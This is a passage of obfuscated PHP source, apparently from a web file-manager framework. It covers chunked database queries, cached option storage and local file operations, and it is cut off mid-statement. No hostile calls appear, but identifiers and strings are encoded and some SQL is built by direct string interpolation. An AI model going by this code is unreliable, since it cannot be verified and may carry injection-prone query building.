eø²·‰”—¼: $DĞ¬”İ˜Â = is_array($DĞ¬”İ˜Â) ? $DĞ¬”İ˜Â : array(); $C¹Ô¡Š¥¾ = $aƒ‡ïñÁœï[373]; $aŒ•›ÊÅ‚ = 0; goto A‰ÃÙÅÒÇ¡; A‰ÃÙÅÒÇ¡: $d¯í«Õ »ˆ = array(); $fìóå“¯ÈŒ = count($DĞ¬”İ˜Â); for ($Cç»¿–ËÓ„ = 0; $Cç»¿–ËÓ„ < $fìóå“¯ÈŒ; $Cç»¿–ËÓ„++) { $e­àÔøÌ = $DĞ¬”İ˜Â[$Cç»¿–ËÓ„]; if (!is_array($e­àÔøÌ) || count($e­àÔøÌ) != 4) { continue; } $BÉ¥ë¦‰‚ù = "\125\x50\x44\101\124\105\40\x60{$BŞğ†“Úïø}\140\40\x53\x45\x54\x20{$e­àÔøÌ[2]}\40\x3d\40\103\101\x53\105\x20{$e­àÔøÌ[0]}\40\12"; if ($aŒ•›ÊÅ‚ == 0) { $C¹Ô¡Š¥¾ = $BÉ¥ë¦‰‚ù; } $d¯í«Õ »ˆ[] = $aƒ‡ïñÁœï[115] . $e­àÔøÌ[1] . $aƒ‡ïñÁœï[115]; $aŒ•›ÊÅ‚++; $C¹Ô¡Š¥¾ .= "\40\x57\x48\105\x4e\40\x27{$e­àÔøÌ[1]}\x27\x20\124\110\105\x4e\40\x27{$e­àÔøÌ[3]}\x27\40\xa"; if ($aŒ•›ÊÅ‚ == $F®§Øˆ…… || $Cç»¿–ËÓ„ == $fìóå“¯ÈŒ - 1) { goto eºùÍñÕôõ; cê÷­¸×ƒ: $d¯í«Õ »ˆ = array(); goto B¶°…–ÔÂĞ; f­†®¤ôå¤: $aŒ•›ÊÅ‚ = 0; $C¹Ô¡Š¥¾ = $BÉ¥ë¦‰‚ù; $this->chunkEventCheck(count($d¯í«Õ »ˆ)); goto cê÷­¸×ƒ; eºùÍñÕôõ: $C¦Œë¤Äˆò = implode($aƒ‡ïñÁœï[47], $d¯í«Õ »ˆ); $C¹Ô¡Š¥¾ .= "\40\105\116\104\x20\x20\x57\110\x45\122\105\40{$e­àÔøÌ[0]}\40\111\116\x20\x28{$C¦Œë¤Äˆò}\x29\x20"; $this->execute($C¹Ô¡Š¥¾); goto f­†®¤ôå¤; B¶°…–ÔÂĞ: } } goto C±Ê³ô…Ô­; C˜ÉñÇ¹Ù: $aƒ‡ïñÁœï =& $_SERVER[Š‰]; $BŞğ†“Úïø = $this->tablePrefix . $this->tableName; $F®§Øˆ…… = self::SQL_WHERE_IN_CHUNK; goto eø²·‰”—¼; BªºÀÃÂëÁ: } public function saveAllEach($cÚ®ØëÑÇï) { $c·øÈªÙºé =& $_SERVER[Š‰]; $d‘Ê…°æ¨ = $this->tablePrefix . $this->tableName; foreach ($cÚ®ØëÑÇï as $Dè¥È–‰‚Õ) { if (!is_array($Dè¥È–‰‚Õ) || count($Dè¥È–‰‚Õ) != 4) { continue; } $B¬í„­ƒñ¿ = $Dè¥È–‰‚Õ[0] . $c·øÈªÙºé[374] . $Dè¥È–‰‚Õ[1] . $c·øÈªÙºé[115]; $D£¯¤ù‚Õ† = $Dè¥È–‰‚Õ[2] . $c·øÈªÙºé[374] . $Dè¥È–‰‚Õ[3] . $c·øÈªÙºé[115]; $B”öë±Ú»ï = "\x75\x70\x64\x61\164\145\40{$d‘Ê…°æ¨}\40\x73\x65\164\x20{$D£¯¤ù‚Õ†}\40\167\150\x65\x72\x65\x20{$B¬í„­ƒñ¿}\x3b"; $this->execute($B”öë±Ú»ï); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($F„Âìù¶º¦ = false, $AÃÔ—¤¹Ê = false) { $this->_chunkEvent = $F„Âìù¶º¦; $this->_chunkEventParam = $AÃÔ—¤¹Ê; } private function chunkEventCheck($eÓªÄØİ) { if (!$this->_chunkEvent) { return; } $A¼Š™ãÍè = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $A¼Š™ãÍè[$_SERVER[Š‰][375]] = $eÓªÄØİ; Hook::trigger($this->_chunkEvent, $A¼Š™ãÍè); } public function addAll($eÁº²½¹î, $CÑîÁò–Ç = array(), $Bå„”šø¨ = false) { goto e’ÃğÔê­; B»Ìö¨¹Ü: if (empty($eÁº²½¹î)) { $this->error = think_lang($cŒäÛßæøó[267]); return !1; } $CÑîÁò–Ç = $this->_parseOptions($CÑîÁò–Ç); foreach ($eÁº²½¹î as $fŞ§’•±âò => $d«´¾ÀÃ¹) { $eÁº²½¹î[$fŞ§’•±âò] = $this->_facade($d«´¾ÀÃ¹); $this->_beforeInsert($eÁº²½¹î[$fŞ§’•±âò], $CÑîÁò–Ç); } goto D‰‚ÂŠ„ÓÍ; e’ÃğÔê­: $cŒäÛßæøó =& $_SERVER[Š‰]; ignore_timeout(); $CèèÈ¼íÎß = self::SQL_WHERE_IN_CHUNK; goto B»Ìö¨¹Ü; D‰‚ÂŠ„ÓÍ: if (method_exists($this->db, $cŒäÛßæøó[268])) { for ($eÜ—“Àáö® = 0; $eÜ—“Àáö® < count($eÁº²½¹î); $eÜ—“Àáö® += $CèèÈ¼íÎß) { $AÄÕ¢ö˜‘ = array_slice($eÁº²½¹î, $eÜ—“Àáö®, $CèèÈ¼íÎß); if (!is_array($AÄÕ¢ö˜‘) || count($AÄÕ¢ö˜‘) == 0) { break; } $A†Û–‰²ªƒ = $this->db->insertAll($AÄÕ¢ö˜‘, $CÑîÁò–Ç, $Bå„”šø¨); $this->chunkEventCheck(count($AÄÕ¢ö˜‘)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($eÁº²½¹î as $fŞ§’•±âò => $d«´¾ÀÃ¹) { $A†Û–‰²ªƒ = $this->db->insert($d«´¾ÀÃ¹, $CÑîÁò–Ç, $Bå„”šø¨); } $this->commit(); } if (!1 !== $A†Û–‰²ªƒ) { $f¤•ê±ø× = $this->getLastInsID(); if ($f¤•ê±ø×) { return $f¤•ê±ø×; } } return $A†Û–‰²ªƒ; goto a¥ôŠì“ñµ; a¥ôŠì“ñµ: } public function save($D†°ĞÅ¤ˆ = '', $BÔÎùâ£¨° = array()) { goto CøŒé‡œ; Eî¢±ãõ¨Õ: for ($D°„”ÀÖ = 0; $D°„”ÀÖ < $E´¿Õòğ¬ª; $D°„”ÀÖ += $BÆ¶ Û‰®½) { $FÛ¾„É’ÄÀ = array_slice($BÈ½«ÒÆÛî, $D°„”ÀÖ, $BÆ¶ Û‰®½); if (!is_array($FÛ¾„É’ÄÀ) || count($FÛ¾„É’ÄÀ) == 0) { break; } $fˆÁ‘Æ½µñ[$eØÑ‰‚ª–[271]][$C¸øõ•á„È][1] = $FÛ¾„É’ÄÀ; $this->optionsValue($fˆÁ‘Æ½µñ); $B™ñôá¡Ìé += parent::save($D†°ĞÅ¤ˆ, $BÔÎùâ£¨°); $this->chunkEventCheck(count($FÛ¾„É’ÄÀ)); } $this->chunkEventSet(); return $B™ñôá¡Ìé; goto BÃ ÓùÌÉ„; CøŒé‡œ: $eØÑ‰‚ª– =& $_SERVER[Š‰]; $BÆ¶ Û‰®½ = self::SQL_WHERE_IN_CHUNK; $fˆÁ‘Æ½µñ = $this->optionsValue(); goto EƒÉÔòğî; EƒÉÔòğî: $C¸øõ•á„È = $this->findWhereField($fˆÁ‘Æ½µñ); if (!$C¸øõ•á„È) { return parent::save($D†°ĞÅ¤ˆ, $BÔÎùâ£¨°); } $B™ñôá¡Ìé = 0; goto bô¦–‹àÙä; bô¦–‹àÙä: $BÈ½«ÒÆÛî = $fˆÁ‘Æ½µñ[$eØÑ‰‚ª–[271]][$C¸øõ•á„È][1]; $BÈ½«ÒÆÛî = is_array($BÈ½«ÒÆÛî) ? $BÈ½«ÒÆÛî : array(); $E´¿Õòğ¬ª = count($BÈ½«ÒÆÛî); goto Eî¢±ãõ¨Õ; BÃ ÓùÌÉ„: } public function add($fùæÏ‚Íğ« = '', $dõçÁ½ù‹ì = array(), $DÔµ¢ïŠÏ = false) { if ($this->addTaskStatus && is_array($fùæÏ‚Íğ«)) { $this->addTaskData[] = $fùæÏ‚Íğ«; return; } return parent::add($fùæÏ‚Íğ«, $dõçÁ½ù‹ì, $DÔµ¢ïŠÏ); } public function parseWhereLike($c¢Ÿ—ÓºèË, $cñ±£Õô« = '', $b¢ ğ¿ãª× = false, &$aŒµÈ¸îĞ¼ = false) { goto bÆ¾Œ¹Ô; a‰åØ·: if (!is_array($c¢Ÿ—ÓºèË)) { return $c¢Ÿ—ÓºèË; } $AßÊóìøÓá = array(); $båõùÑ¢å = 0; goto F¥ÍÚÒ…Ô; bÆ¾Œ¹Ô: $fÖ›‚­ƒ  =& $_SERVER[Š‰]; $fÉÍßÑ¹¹í = $GLOBALS[$fÖ›‚­ƒ [6]][$fÖ›‚­ƒ [376]]; if (!$fÉÍßÑ¹¹í[$fÖ›‚­ƒ [377]]) { return $c¢Ÿ—ÓºèË; } goto a‰åØ·; F¥ÍÚÒ…Ô: foreach ($c¢Ÿ—ÓºèË as $Aóè¼Æ•óö => $AÎØî‚Ğ —) { if (is_array($AÎØî‚Ğ —) && count($AÎØî‚Ğ —) == 2 && $AÎØî‚Ğ —[0] == $fÖ›‚­ƒ [378] && is_string($AÎØî‚Ğ —[1]) && substr($AÎØî‚Ğ —[1], 0, 1) == $fÖ›‚­ƒ [379] && substr($AÎØî‚Ğ —[1], strlen($AÎØî‚Ğ —[1]) - 1, 1) == $fÖ›‚­ƒ [379]) { goto cÄÆÛÆ‘ğâ; cÄÆÛÆ‘ğâ: $aŒµÈ¸îĞ¼ = !0; $C‰¸â ßÅ = is_string($Aóè¼Æ•óö) ? $Aóè¼Æ•óö : $cñ±£Õô«; $D—¢æ×Çñ = substr($AÎØî‚Ğ —[1], 1, strlen($AÎØî‚Ğ —[1]) - 2); goto B…Ë…›Ô‘; DÁ±ÄØíïÆ: $AßÊóìøÓá[$båõùÑ¢å] = $fÖ›‚­ƒ [382] . $C‰¸â ßÅ . $fÖ›‚­ƒ [383] . $D—¢æ×Çñ . $fÖ›‚­ƒ [384]; $båõùÑ¢å++; continue; goto FŒ»¼§Ç•; B…Ë…›Ô‘: $D—¢æ×Çñ = $this->db->escapeString($D—¢æ×Çñ); if (!strpos($C‰¸â ßÅ, $fÖ›‚­ƒ [94])) { $C‰¸â ßÅ = $fÖ›‚­ƒ [380] . $C‰¸â ßÅ . $fÖ›‚­ƒ [380]; } if ($fÉÍßÑ¹¹í[$fÖ›‚­ƒ [381]]) { $D—¢æ×Çñ = $fÖ›‚­ƒ [115] . $D—¢æ×Çñ . $fÖ›‚­ƒ [115]; } goto DÁ±ÄØíïÆ; FŒ»¼§Ç•: } if (is_array($AÎØî‚Ğ —)) { $cñ±£Õô« = is_string($Aóè¼Æ•óö) ? $Aóè¼Æ•óö : $cñ±£Õô«; $AÎØî‚Ğ — = $this->parseWhereLike($AÎØî‚Ğ —, $cñ±£Õô«, !0, $aŒµÈ¸îĞ¼); } if (is_numeric($Aóè¼Æ•óö)) { $AßÊóìøÓá[$båõùÑ¢å] = $AÎØî‚Ğ —; $båõùÑ¢å++; } else { $AßÊóìøÓá[$Aóè¼Æ•óö] = $AÎØî‚Ğ —; } } if ($aŒµÈ¸îĞ¼ && !$b¢ ğ¿ãª×) { trace_log(array($AßÊóìøÓá, $c¢Ÿ—ÓºèË), $fÖ›‚­ƒ [271]); } return $AßÊóìøÓá; goto A§ø—¤‹•—; A§ø—¤‹•—: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($f‡‚÷µŒì¼ = array()) { goto b²¼„ÅË×; b²¼„ÅË×: $cšÅáœÖÁÎ =& $_SERVER[Š‰]; $FÕº‡öš­õ = self::SQL_WHERE_IN_CHUNK; $cë˜İ–„³¼ = $this->optionsValue(); goto DÓŒ“‹íÕ; BÕß‰“Â’: return $cËˆ¼àÀ…÷; goto a³Ù„’Ô”¾; DÓŒ“‹íÕ: $e³Ô–Æ½ = $this->findWhereField($cë˜İ–„³¼); if (!$e³Ô–Æ½ || isset($cë˜İ–„³¼[$cšÅáœÖÁÎ[288]]) || isset($cë˜İ–„³¼[$cšÅáœÖÁÎ[349]])) { return parent::select($f‡‚÷µŒì¼); } $Cé‰ÕíèÈ = $cë˜İ–„³¼[$cšÅáœÖÁÎ[271]][$e³Ô–Æ½][1]; goto dÇàìŸÃ×; dÇàìŸÃ×: $Cé‰ÕíèÈ = is_array($Cé‰ÕíèÈ) ? $Cé‰ÕíèÈ : array(); $cËˆ¼àÀ…÷ = null; for ($eÅá¢éÁÎ = 0; $eÅá¢éÁÎ < count($Cé‰ÕíèÈ); $eÅá¢éÁÎ += $FÕº‡öš­õ) { $DŒÊæ´ŸÀÈ = array_slice($Cé‰ÕíèÈ, $eÅá¢éÁÎ, $FÕº‡öš­õ); if (!is_array($DŒÊæ´ŸÀÈ) || count($DŒÊæ´ŸÀÈ) == 0) { break; } $cë˜İ–„³¼[$cšÅáœÖÁÎ[271]][$e³Ô–Æ½][1] = $DŒÊæ´ŸÀÈ; $this->optionsValue($cë˜İ–„³¼); $cªİ·åÖ´ = parent::select($f‡‚÷µŒì¼); if (!$cªİ·åÖ´) { continue; } if (is_null($cËˆ¼àÀ…÷)) { $cËˆ¼àÀ…÷ = array(); } $cËˆ¼àÀ…÷ = array_merge($cËˆ¼àÀ…÷, $cªİ·åÖ´); } goto BÕß‰“Â’; a³Ù„’Ô”¾: } public function delete($e¶øä­”âÔ = array()) { goto FôòÔÂŒ‘Ø; FôòÔÂŒ‘Ø: $BñÍ•»ÄŠ =& $_SERVER[Š‰]; $F³œ‘±™˜ = self::SQL_WHERE_IN_CHUNK; $Aã‰½ŞÅêÁ = $this->optionsValue(); goto cëš×Ÿœ; cëš×Ÿœ: $c®„ˆìœµî = $this->findWhereField($Aã‰½ŞÅêÁ); if (!$c®„ˆìœµî) { return parent::delete($e¶øä­”âÔ); } $f–ÄçŒù = 0; goto eÛìÂÖ ¡÷; eÛìÂÖ ¡÷: $AœÛ¹ß¨« = $Aã‰½ŞÅêÁ[$BñÍ•»ÄŠ[271]][$c®„ˆìœµî][1]; $AœÛ¹ß¨« = is_array($AœÛ¹ß¨«) ? $AœÛ¹ß¨« : array(); for ($Cê•ÊÉ‘‡Ü = 0; $Cê•ÊÉ‘‡Ü < count($AœÛ¹ß¨«); $Cê•ÊÉ‘‡Ü += $F³œ‘±™˜) { $fò—ë‹Ä±è = array_slice($AœÛ¹ß¨«, $Cê•ÊÉ‘‡Ü, $F³œ‘±™˜); if (!is_array($fò—ë‹Ä±è) || count($fò—ë‹Ä±è) == 0) { break; } $Aã‰½ŞÅêÁ[$BñÍ•»ÄŠ[271]][$c®„ˆìœµî][1] = $fò—ë‹Ä±è; $this->optionsValue($Aã‰½ŞÅêÁ); $f–ÄçŒù += parent::delete($e¶øä­”âÔ); } goto F¾§Ü°âÑ°; F¾§Ü°âÑ°: return $f–ÄçŒù; goto BêİÏ‡Å•å; BêİÏ‡Å•å: } private function findWhereField($Fœ¹ŒŞ¨›À) { $f«ˆïÚ«®è =& $_SERVER[Š‰]; $d›ŒŸ‘ÎˆĞ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Fœ¹ŒŞ¨›À) || !is_array($Fœ¹ŒŞ¨›À[$f«ˆïÚ«®è[271]])) { return !1; } foreach ($Fœ¹ŒŞ¨›À[$f«ˆïÚ«®è[271]] as $eÙ®ëÏ => $aº‡Œèš«) { if (is_array($aº‡Œèš«) && isset($aº‡Œèš«[0]) && is_string($aº‡Œèš«[0]) && strtolower($aº‡Œèš«[0]) == $f«ˆïÚ«®è[7] && is_array($aº‡Œèš«[1]) && count($aº‡Œèš«[1]) > $d›ŒŸ‘ÎˆĞ) { ignore_timeout(); return $eÙ®ëÏ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\145\x6d\x4f\160\x74\151\157\x6e"; public $field = array(); public function listData($Bª”±¡¥ª = false, $c×¨„î­„ = "\155\x6f\x64\x69\146\171\124\151\x6d\x65", $F»ä‚£¿ì = false) { $E‰ÈßÌÒáÈ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$E‰ÈßÌÒáÈ) { return $Bª”±¡¥ª ? null : array(); } if (!$Bª”±¡¥ª) { $E‰ÈßÌÒáÈ = array_filter(array_values($E‰ÈßÌÒáÈ)); return array_sort_by($E‰ÈßÌÒáÈ, $c×¨„î­„, $F»ä‚£¿ì); } return $E‰ÈßÌÒáÈ[$_SERVER[Š‰][385] . $Bª”±¡¥ª]; } public function insert($dòñµîò) { goto C‰ÖÛ¡´; C‰ÖÛ¡´: $d°ÊØ¬Ğî =& $_SERVER[Š‰]; $dòñµîò = array_field_key($dòñµîò, $this->field); $EÀ‚‰ÂÔ‹ = Model($this->modelType)->get($d°ÊØ¬Ğî[386], $this->optionType . $d°ÊØ¬Ğî[387]); goto fÊĞ¸ç•íË; e¹êñƒ¤­ñ: $dòñµîò[$d°ÊØ¬Ğî[83]] = time(); Model($this->modelType)->set($d°ÊØ¬Ğî[386], $EÀ‚‰ÂÔ‹, $this->optionType . $d°ÊØ¬Ğî[387]); Model($this->modelType)->set($d°ÊØ¬Ğî[385] . $EÀ‚‰ÂÔ‹, $dòñµîò, $this->optionType); goto e¡î„šöë; fÊĞ¸ç•íË: $EÀ‚‰ÂÔ‹ = $EÀ‚‰ÂÔ‹ ? $EÀ‚‰ÂÔ‹ : 0; $dòñµîò[$d°ÊØ¬Ğî[388]] = ++$EÀ‚‰ÂÔ‹; $dòñµîò[$d°ÊØ¬Ğî[192]] = time(); goto e¹êñƒ¤­ñ; e¡î„šöë: return $EÀ‚‰ÂÔ‹; goto B¥äš‰ê‘‰; B¥äš‰ê‘‰: } public function update($f¢ºµ¥Ñ‹œ, $EŠ×æÔã¾Ö) { goto FÜøòóŸ‘; FÜøòóŸ‘: $F¦Ş¿¦‘Ú =& $_SERVER[Š‰]; $EŠ×æÔã¾Ö = array_field_key($EŠ×æÔã¾Ö, $this->field); $AîÔª²®°ò = $this->listData($f¢ºµ¥Ñ‹œ); goto c—Òƒë¤ÏÄ; c¹Ê×¯Õá: return Model($this->modelType)->set($F¦Ş¿¦‘Ú[385] . $f¢ºµ¥Ñ‹œ, $EŠ×æÔã¾Ö, $this->optionType); goto d†ö‡¥‰ñ; c—Òƒë¤ÏÄ: if (!$AîÔª²®°ò) { return !1; } $EŠ×æÔã¾Ö = array_merge($AîÔª²®°ò, $EŠ×æÔã¾Ö); $EŠ×æÔã¾Ö[$F¦Ş¿¦‘Ú[83]] = time(); goto c¹Ê×¯Õá; d†ö‡¥‰ñ: } public function remove($f¶™¦é† ) { return Model($this->modelType)->remove($_SERVER[Š‰][385] . $f¶™¦é† , $this->optionType); } public function clear() { $bÃ·òíèÇÔ =& $_SERVER[Š‰]; Model($this->modelType)->remove($bÃ·òíèÇÔ[386], $this->optionType . $bÃ·òíèÇÔ[387]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($B°““†«·°, $E‘Òù—–ÜÍ) { if (!$E‘Òù—–ÜÍ) { return !1; } $a»ñØÙÇìá = $this->listData(); $a»ñØÙÇìá = array_to_keyvalue($a»ñØÙÇìá, $B°““†«·°); return isset($a»ñØÙÇìá[$E‘Òù—–ÜÍ]) ? $a»ñØÙÇìá[$E‘Òù—–ÜÍ] : !1; } public function findByName($aĞ……„Š÷˜) { return $this->findByKey($_SERVER[Š‰][28], $aĞ……„Š÷˜); } protected function resetData($F½’ãÍßôˆ) { $EÓ„·ñÅŸ› =& $_SERVER[Š‰]; $F½’ãÍßôˆ = is_array($F½’ãÍßôˆ) ? $F½’ãÍßôˆ : array(); $b‹¤‹¹ƒä« = array(); for ($DÁ…¾òÔ¶Ü = 0; $DÁ…¾òÔ¶Ü < count($F½’ãÍßôˆ); $DÁ…¾òÔ¶Ü++) { $b‹¤‹¹ƒä«[$EÓ„·ñÅŸ›[385] . $F½’ãÍßôˆ[$DÁ…¾òÔ¶Ü][$EÓ„·ñÅŸ›[388]]] = $F½’ãÍßôˆ[$DÁ…¾òÔ¶Ü]; } return Model($this->modelType)->set($b‹¤‹¹ƒä«, !1, $this->optionType); } private function getAutoName($fŠãùøà) { $Bñ»ñô‹¿§ = array_to_keyvalue($this->listData(), $_SERVER[Š‰][28]); if (!$Bñ»ñô‹¿§ || !isset($Bñ»ñô‹¿§[$fŠãùøà])) { return $fŠãùøà; } for ($CäÙÜ×Î£Ô = 1; $CäÙÜ×Î£Ô < count($Bñ»ñô‹¿§); $CäÙÜ×Î£Ô++) { $dÖá™„ƒ³ = $fŠãùøà . "\50{$CäÙÜ×Î£Ô}\51"; if (!isset($Bñ»ñô‹¿§[$dÖá™„ƒ³])) { return $dÖá™„ƒ³; } } return $dÖá™„ƒ³; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($d¿‚Ú«±ö´ = false, $e¹òééé æ = '', $dÒª‡ïÊ“¹ = false) { goto D…˜ƒÅ§´; e¢×µ‹¬·: $AªäğÑ—¹´ = is_array($AªäğÑ—¹´) ? $AªäğÑ—¹´ : array(); if (is_array($AŒ‹®¼•£)) { $AŒ‹®¼•£ = array_merge($AªäğÑ—¹´, $AŒ‹®¼•£); return $d¿‚Ú«±ö´ ? isset($AŒ‹®¼•£[$d¿‚Ú«±ö´]) ? $AŒ‹®¼•£[$d¿‚Ú«±ö´] : null : $AŒ‹®¼•£; } $fÈ¶æ’ÜØØ = $this->filterWhere(array($FË™‘Ø´«[29] => $e¹òééé æ)); goto eä‹šÌ­’; D…˜ƒÅ§´: $FË™‘Ø´« =& $_SERVER[Š‰]; $AŒ‹®¼•£ = $this->cacheGet($e¹òééé æ); $AªäğÑ—¹´ = $this->optionDefault($e¹òééé æ); goto e¢×µ‹¬·; FÁ­º¶…µ·: $this->cacheSet($e¹òééé æ, $AŒ‹®¼•£); $AŒ‹®¼•£ = array_merge($AªäğÑ—¹´, $AŒ‹®¼•£); return $d¿‚Ú«±ö´ ? $AŒ‹®¼•£[$d¿‚Ú«±ö´] : $AŒ‹®¼•£; goto CÑñğ‚ÍŠí; eä‹šÌ­’: $AŒ‹®¼•£ = $this->where($fÈ¶æ’ÜØØ)->select(); $AŒ‹®¼•£ = array_to_keyvalue($AŒ‹®¼•£, $FË™‘Ø´«[92], $FË™‘Ø´«[370]); foreach ($AŒ‹®¼•£ as $e„©¡Î™·Á => $eôÊÁé«×™) { if ($dÒª‡ïÊ“¹ || in_array($e„©¡Î™·Á, $this->jsonField)) { $AŒ‹®¼•£[$e„©¡Î™·Á] = json_decode($eôÊÁé«×™, !0); } } goto FÁ­º¶…µ·; CÑñğ‚ÍŠí: } public function set($cºÕÅÊæÑä, $f„Çîóö£ = false, $FäÍŒÂ“Õ« = '') { goto E‹¹ˆ³òë‡; e¢‡ğêæ¿Í: $cííˆå—Ú¢ = is_array($cºÕÅÊæÑä) ? $cºÕÅÊæÑä : array($cºÕÅÊæÑä => $f„Çîóö£); foreach ($cííˆå—Ú¢ as $d²‘ñË¨·Õ => $bÈô¬Ñ·) { if (is_array($bÈô¬Ñ·)) { $bÈô¬Ñ· = json_encode_force($bÈô¬Ñ·); } $this->checkLength($bÈô¬Ñ·, !1, $this->tableName . $b¡çÎïÍã¯[4] . $cºÕÅÊæÑä); $bÈô¬Ñ· = self::textEncode($bÈô¬Ñ·); $cííˆå—Ú¢ = array($b¡çÎïÍã¯[29] => $FäÍŒÂ“Õ«, $b¡çÎïÍã¯[92] => $d²‘ñË¨·Õ, $b¡çÎïÍã¯[370] => $bÈô¬Ñ·); $F¨ÃÏ‰Æ¸ê[] = $this->filterWhere($cííˆå—Ú¢); } if (!$F¨ÃÏ‰Æ¸ê) { return !0; } goto f®ë‰§õç; E‹¹ˆ³òë‡: $b¡çÎïÍã¯ =& $_SERVER[Š‰]; $this->cacheRemove($FäÍŒÂ“Õ«); $F¨ÃÏ‰Æ¸ê = array(); goto e¢‡ğêæ¿Í; f®ë‰§õç: return $this->addAll($F¨ÃÏ‰Æ¸ê, array(), !0); goto c«ÉÎö¹¨‚; c«ÉÎö¹¨‚: } protected function optionDefault($FÖ»®„Ó÷¾ = '') { return !1; } public function setDeep($eá¸ŠâîÄÁ, $Eœ§Ò âĞ‡ = false, $aŸŞŒ°¡ï = '') { $fÁ‰Ÿ”³ê = explode($_SERVER[Š‰][94], $eá¸ŠâîÄÁ); $DÌ‚¦Àã© = $this->get(); array_set_value($DÌ‚¦Àã©, $eá¸ŠâîÄÁ, $Eœ§Ò âĞ‡); $this->set($fÁ‰Ÿ”³ê[0], $DÌ‚¦Àã©[$fÁ‰Ÿ”³ê[0]], $aŸŞŒ°¡ï); } public function remove($eËºÓ¹×í, $F­ßªõÙïÓ = '') { $A„Êì¿äè =& $_SERVER[Š‰]; $this->cacheRemove($F­ßªõÙïÓ); $dÙèÆÈÌÆá = $this->filterWhere(array($A„Êì¿äè[92] => $eËºÓ¹×í, $A„Êì¿äè[29] => $F­ßªõÙïÓ)); if (is_null($eËºÓ¹×í)) { unset($dÙèÆÈÌÆá[$A„Êì¿äè[92]]); } return $this->where($dÙèÆÈÌÆá)->delete(); } public function cacheSet($e¼ŠÚØùãù, $F”µã½Ô²³ = false) { return Cache::set($this->cacheKey($e¼ŠÚØùãù), $F”µã½Ô²³); } public function cacheGet($B¡¹¼ŠâÕÆ) { return Cache::get($this->cacheKey($B¡¹¼ŠâÕÆ)); } public function cacheRemove($aË–Œƒµ‡) { return Cache::remove($this->cacheKey($aË–Œƒµ‡)); } protected function filterWhere($dÔÕ¾çø) { return $dÔÕ¾çø; } protected function cacheKey($f˜Ü¦±õ«á) { return $f˜Ü¦±õ«á; } } goto d¡×ø—Ó¶; Còâôùç­¿: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($c‡Ãğƒ‰É´) { if (substr($c‡Ãğƒ‰É´, 0, 2) == $_SERVER[Š‰][1218]) { $c‡Ãğƒ‰É´ = BASIC_PATH . substr($c‡Ãğƒ‰É´, 2); } return $c‡Ãğƒ‰É´; } public function iconvApp($f˜£°ìãâ½) { $bËËº”¼¥« =& $_SERVER[Š‰]; global $config; return $this->iconvTo($f˜£°ìãâ½, $config[$bËËº”¼¥«[1216]], $config[$bËËº”¼¥«[1215]]); } public function iconvSystem($b§ÆÌÜŸ®á) { $B¨¼Ã·ê§ =& $_SERVER[Š‰]; global $config; return $this->iconvTo($b§ÆÌÜŸ®á, $config[$B¨¼Ã·ê§[1215]], $config[$B¨¼Ã·ê§[1216]]); } public function getPathOuter($AŸàÒ«óÁÎ) { goto bš¥ä«¶É; bš¥ä«¶É: $e‡ÛÛ„ÀÎ =& $_SERVER[Š‰]; $f›î“×°ßÀ = $this->iconvApp($this->pathBase); $AŸàÒ«óÁÎ = $this->iconvApp($AŸàÒ«óÁÎ); goto D‹Ô‹ÁøŒ; D‹Ô‹ÁøŒ: if (substr($f›î“×°ßÀ, 0, 2) == $e‡ÛÛ„ÀÎ[1218]) { $f›î“×°ßÀ = BASIC_PATH . substr($f›î“×°ßÀ, 2); } if (substr($AŸàÒ«óÁÎ, 0, 2) == $e‡ÛÛ„ÀÎ[1218]) { $AŸàÒ«óÁÎ = BASIC_PATH . substr($AŸàÒ«óÁÎ, 2); } $f›î“×°ßÀ = KodIO::clear($f›î“×°ßÀ); goto a®ÔšØÔ; a®ÔšØÔ: $AŸàÒ«óÁÎ = KodIO::clear($AŸàÒ«óÁÎ); $AŸàÒ«óÁÎ = substr($AŸàÒ«óÁÎ, strlen($f›î“×°ßÀ)); if (empty($this->pathDriver)) { return $AŸàÒ«óÁÎ; } goto cåÌ‡¥½È; cåÌ‡¥½È: return $this->pathDriver . $e‡ÛÛ„ÀÎ[8] . ltrim($AŸàÒ«óÁÎ, $e‡ÛÛ„ÀÎ[8]); goto E’ù‘«¬Üî; E’ù‘«¬Üî: } public function mkfile($f‡øÅ¬‘¢, $B¿¡ë¤ç¥ù = '', $cø„Ù²ğ§Î = REPEAT_RENAME) { $f‡øÅ¬‘¢ = $this->iconvSystem($f‡øÅ¬‘¢); @touch($f‡øÅ¬‘¢); if ($B¿¡ë¤ç¥ù) { file_put_contents($f‡øÅ¬‘¢, $B¿¡ë¤ç¥ù); } return is_file($f‡øÅ¬‘¢) ? $this->getPathOuter($f‡øÅ¬‘¢) : !1; } public function mkdir($e¤ÛˆÔ²ƒù, $FŠØÈ‚çä§ = REPEAT_SKIP) { $e¤ÛˆÔ²ƒù = $this->iconvSystem($e¤ÛˆÔ²ƒù); if (is_dir($e¤ÛˆÔ²ƒù)) { return $this->getPathOuter($e¤ÛˆÔ²ƒù); } @mkdir($e¤ÛˆÔ²ƒù, 511, !0); return is_dir($e¤ÛˆÔ²ƒù) ? $this->getPathOuter($e¤ÛˆÔ²ƒù) : !1; } public function copyFile($f×İÇñ§Ç, $f‘åĞĞ‘) { $this->mkdir($this->pathFather($f‘åĞĞ‘)); $f×İÇñ§Ç = $this->iconvSystem($f×İÇñ§Ç); $f‘åĞĞ‘ = $this->iconvSystem($f‘åĞĞ‘); $Cæ‹òÀ‡ = copy_64($f×İÇñ§Ç, $f‘åĞĞ‘); return $Cæ‹òÀ‡ ? $this->getPathOuter($f‘åĞĞ‘) : !1; } public function moveFile($A½‰˜™¨, $bù µ¿‡Àè) { $this->mkdir($this->pathFather($bù µ¿‡Àè)); $A½‰˜™¨ = $this->iconvSystem($A½‰˜™¨); $bù µ¿‡Àè = 